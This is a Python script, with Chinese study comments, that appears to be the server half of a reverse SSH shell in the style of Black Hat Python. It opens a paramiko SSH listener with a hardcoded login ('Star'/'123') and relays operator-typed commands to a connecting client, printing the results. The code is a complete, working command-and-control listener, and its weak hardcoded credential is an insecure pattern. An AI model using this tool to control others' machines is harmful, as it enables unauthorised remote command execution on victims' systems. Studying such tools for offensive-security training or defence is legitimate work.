#!/usr/bin/env python3
# coding=utf-8
from socket import *
import paramiko
import threading
import sys

# http://freeloda.blog.51cto.com/2033581/1216176
# 使用命令生成私钥openssl genrsa -out rsa_private_key.pem 1024，经过抓包，发现是加密的
# http://www.jb51.net/article/70036.htm
host_key = paramiko.RSAKey(filename='test_rsa.key')


class Server(paramiko.ServerInterface):
    def __init__(self):
        # 执行start_server()方法首先会触发Event，如果返回成功，is_active返回True
        self.event = threading.Event()

    # 当认证成功，client会请求打开一个Channel
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    # 当is_active返回True，进入到认证阶段
    def check_auth_password(self, username, password):
        if (username == 'Star') and (password == '123'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


server = sys.argv[1]
ssh_port = int(sys.argv[2])

# 建立服务端socket
try:
    sock = socket(AF_INET, SOCK_STREAM)
    # SOL_SOCKET    意思是正在使用的socket选项。  
    # SO_REUSEADDR  当socket关闭后，本地端用于该socket的端口号立刻就可以被重用
    # 1    表示将SO_REUSEADDR标记为TRUE，操作系统会在服务器socket被关闭或服务器进程终止后马上释放该服务器的端口，否则操作系统会保留几分钟该端口。
    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print('[+] Listening for connection ...')
    client, addr = sock.accept()
except Exception as e:
    print('[-] Listen failed: ' + str(e))
    sys.exit(1)
print('[+] Got a connection!')

try:
    # 用sock.accept()返回的socket实例化Transport
    bhSession = paramiko.Transport(client)
    # 添加一个RSA密钥加密会话
    bhSession.add_server_key(host_key)
    server = Server()
    try:
        # 启动SSH服务端    
        bhSession.start_server(server=server)
    except paramiko.SSHException as x:
        print('[-] SSH negotiation failed.')
    chan = bhSession.accept(20)  # 等待客户端开启通道，超时时间为20s
    # accept(timeout=None)
    # Return the next channel opened by the client over this transport, in server mode. If no channel is opened before the given timeout, None is returned.
    # Parameters:   timeout (int) – seconds to wait for a channel, or None to wait forever
    # Returns:  a new Channel opened by the client
    # http://docs.paramiko.org/en/1.15/api/transport.html
    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send(b'Welcome to ssh')
    while True:
        try:
            command = input("Enter command: ").strip('\n')
            if command != 'exit':
                # 输入值编码
                chan.send(command.encode("utf-8"))
                # 接收值编码
                print(chan.recv(1024).decode("utf-8") + '\n')
            else:
                chan.send(b'exit')
                print('exiting')
                bhSession.close()
                # 正常情况没有输出，这里让它报出异常
                raise Exception('exit')
        except KeyboardInterrupt:
            bhSession.close()
except Exception as e:
    print('[-] Caught exception: ' + str(e))
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)